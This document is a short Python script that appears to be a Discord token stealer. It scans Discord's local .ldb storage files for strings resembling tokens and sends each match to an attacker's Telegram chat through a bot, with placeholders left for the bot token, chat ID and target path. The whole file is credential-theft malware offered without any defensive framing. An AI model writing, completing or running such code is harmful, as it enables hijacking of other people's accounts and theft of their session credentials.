import os
import re
import telegram

# Initialize the Telegram bot (replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values)
bot = telegram.Bot(token='YOUR_BOT_TOKEN')
chat_id = 'YOUR_CHAT_ID'

def send_text(message):
    bot.send_message(chat_id=chat_id, text=message)

def search_for_ldb_files(discord_directory):
    ldb_files = []
    for root, dirs, files in os.walk(discord_directory):
        for file in files:
            if file.endswith('.ldb'):
                file_path = os.path.join(root, file)
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                    if "oken" in content:
                        ldb_files.append((file_path, content))
    return ldb_files

def get(discord_directory):
    ldb_files = search_for_ldb_files(discord_directory)

    if not ldb_files:
        send_text("No .ldb files containing 'oken' were found.")
        return

    token_pattern = re.compile(r'[a-fA-F0-9]{28,}')
    found_tokens = []

    for file_path, content in ldb_files:
        tokens = token_pattern.findall(content)
        if tokens:
            found_tokens.extend(tokens)

    for token in found_tokens:
        send_text(f"Token found: {token}")

# Example usage
discord_directory = '/path/to/discord/directory'  # Replace with the actual path to your Discord directory
get(discord_directory)